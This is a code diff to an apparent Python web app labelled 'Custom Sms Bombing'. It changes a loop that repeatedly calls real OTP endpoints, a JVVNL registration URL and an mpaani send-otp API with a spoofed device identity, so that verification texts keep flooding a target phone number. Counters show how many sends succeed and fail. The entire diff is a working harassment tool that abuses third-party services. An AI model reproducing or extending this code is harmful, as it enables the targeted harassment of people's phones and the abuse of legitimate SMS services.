@@ -112,12 +112,30 @@ def MyApp():
             count[NK]["successful"] = 0
             count[NK]["failed"] = 0
         while True:
-            req = requests.get(f"http://www.jvvnlrms.com:7070/bsmartJVVNL/register/mobileValidateAndSendOTP/hellosir143143/Hello/Hello@123/hellosir143143149@gmail.com/{NK}/{MK}").text
-            if 'Sent' in req:
-                count[NK]["successful"] += 1
-                output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Custom Sms Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
-                scroll()
-                time.sleep(0.1)
+            if len(MK) <= 12:
+            	uk = requests.post('https://homedeliverybackend.mpaani.com/auth/send-otp',headers={'client-code': 'charmander'},json={"phone_number": f"{NK}","deviceId": "02847748hsjkenek","info": {"deviceName": "iPhone 15 Pro Max", "modelNumber": "A2884", "manufacturer": "Apple", "brand": "Apple"},"role": "CUSTOMER","identification_hash": f"{MK[:12]}","name": "","isWhatsappNotificationOpted": True}).json()
+            	if uk.get('success') == True:
+            		count[NK]["successful"] += 1
+            		output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Custom Sms Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
+            		scroll()
+            		time.sleep(15)
+            	else:
+            		count[NK]["failed"] += 1
+            		output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Custom Sms Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
+            		scroll()
+            		time.sleep(0.1)
+            elif len(MK) >= 12:
+            	req = requests.get(f"http://www.jvvnlrms.com:7070/bsmartJVVNL/register/mobileValidateAndSendOTP/hellosir143143/Hello/Hello@123/hellosir143143143@gmail.com/{NK}/{MK[:30]}").text
+            	if 'Sent' in req:
+            	   count[NK]["successful"] += 1
+            	   output.put_html(f'<h3 style="color:#2ecc71; text-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71, 0 0 50px #2ecc71; -webkit-text-stroke: 1px black;">✅ Custom Sms Bombing On - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["successful"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
+            	   scroll()
+            	   time.sleep(0.1)
+            	else:
+            		count[NK]["failed"] += 1
+            		output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Custom Sms Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
+            		scroll()
+            		time.sleep(0.1)            		               
             else:
                 count[NK]["failed"] += 1
                 output.put_html(f'<h3 style="color:#e74c3c; text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c, 0 0 40px #e74c3c, 0 0 50px #e74c3c; -webkit-text-stroke: 1px black;">❌ Custom Sms Bombing Off - <span style="color:#3498db;">Count =></span> <span style="color:#e74c3c;">{count[NK]["failed"]}</span></h3><i style="color:#f39c12; -webkit-text-stroke: 1px black;">BY: <span style="font-style:italic; font-weight:bold; color:#e74c3c;">SANCHIT</span></i>')
